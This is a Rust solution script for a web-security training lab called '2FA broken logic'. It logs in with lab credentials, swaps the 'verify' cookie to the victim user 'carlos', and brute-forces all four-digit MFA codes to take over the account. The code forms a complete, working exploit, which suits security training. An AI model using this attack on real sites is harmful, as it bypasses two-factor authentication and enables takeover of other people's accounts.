/**********************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 28/8/2023
*
* Lab: 2FA broken logic
*
* Steps: 1. Get a valid session using valid credentials
*        2. GET /login2 page
*        3. Brute force the mfa-code
*
***********************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use rayon::prelude::*;
use regex::Regex;
use reqwest::{
    blocking::{Client, Response},
    header::HeaderMap,
    redirect::Policy,
    Error,
};
use std::{
    collections::HashMap,
    error,
    fmt::format,
    fs,
    io::{self, Write},
    process, thread, time,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0aa400ea04d8ba59834a1ae6003a003e.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // this session will be used to valid our requests to the server
    let session = get_valid_session(&client, url, "wiener", "peter");

    println!("{}", "1. Obtaining a valid session ..OK".white().bold());

    // must fetch the /login2 page to make the mfa-code be sent to the mail server
    let pre_post_code_res = fetch_login2(&client, url, "carlos", &session);

    println!("{}", "2. GET /login2 page ..OK".white().bold());

    // capture the time before brute forcing
    let start = time::Instant::now();

    println!("{}", "3. Start brute forcing mfa-code ..".white().bold());

    for code in 0..10000 {
        if let Ok(post_code_res) = post_code(&client, url, "carlos", &session, code) {
            // check if the response is Ok
            match post_code_res.status().as_u16() {
                302 => {
                    // redircet means that the code is correct
                    print!(
                        "\r[*] {} => {}",
                        format!("{code:04}").white().bold(),
                        "Correct".green().bold()
                    );
                    io::stdout().flush();

                    // calculate the elapsed timne
                    let elapased_time = (start.elapsed().as_secs() / 60).to_string();

                    println!(
                        "\n{}: {} minutes",
                        "✅ Finished in".green().bold(),
                        elapased_time.white().bold()
                    );

                    // exit from the program
                    process::exit(0);
                }
                _ => {
                    // code is Incorrect
                    print!(
                        "\r[*] {} => {}",
                        format!("{code:04}").white().bold(),
                        "Incorrect".red()
                    );
                    io::stdout().flush();
                }
            }
        } else {
            // failed to make the post code request
            println!(
                "\r[*] {} => {}",
                format!("{:04}", code).white().bold(),
                "REQUEST FAILED".red()
            );
            io::stdout().flush();
        }
    }

    // the time taken by the script to finish
    println!("Finished in: {:?}", start.elapsed());
}

/**************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
***************************************************************/
fn build_client() -> Client {
    reqwest::blocking::ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(time::Duration::from_secs(60))
        .build()
        .unwrap()
}

/**********************************************************
* Function used to get a valid session using correct creds
***********************************************************/
fn get_valid_session(client: &Client, url: &str, username: &str, password: &str) -> String {
    let login_post_res = client
        .post(format!("{url}/login"))
        .form(&HashMap::from([
            ("username", username),
            ("password", password),
        ]))
        .send()
        .unwrap();

    let cookie_header = login_post_res
        .headers()
        .get_all("set-cookie")
        .iter()
        .nth(1)
        .unwrap()
        .to_str()
        .unwrap();

    let re = regex::Regex::new("session=(.*); Secure").unwrap();

    re.captures(cookie_header)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}

/***********************************
* Function used to GET /login2 page
************************************/
fn fetch_login2(client: &Client, url: &str, user: &str, session: &str) -> Response {
    client
        .get(format!("{url}/login2"))
        .header("Cookie", format!("session={session}; verify={user}"))
        .send()
        .unwrap()
}

/************************************
* Function used to POST the mfa code
*************************************/
fn post_code(
    client: &Client,
    url: &str,
    user: &str,
    session: &str,
    code: i32,
) -> Result<Response, Error> {
    client
        .post(format!("{url}/login2"))
        .header("Cookie", format!("session={session}; verify={user}"))
        .form(&HashMap::from([("mfa-code", format!("{code:04}"))]))
        .send()
}

/*******************************************************************
* Function to extract session field from the cookie header
********************************************************************/
fn extract_session_cookie(headers: &HeaderMap) -> String {
    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
    extract_pattern("session=(.*); Secure", cookie)
}

/****************************************************
* Function to extract a pattern form a text
*****************************************************/
fn extract_pattern(pattern: &str, text: &str) -> String {
    Regex::new(pattern)
        .unwrap()
        .captures(text)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}
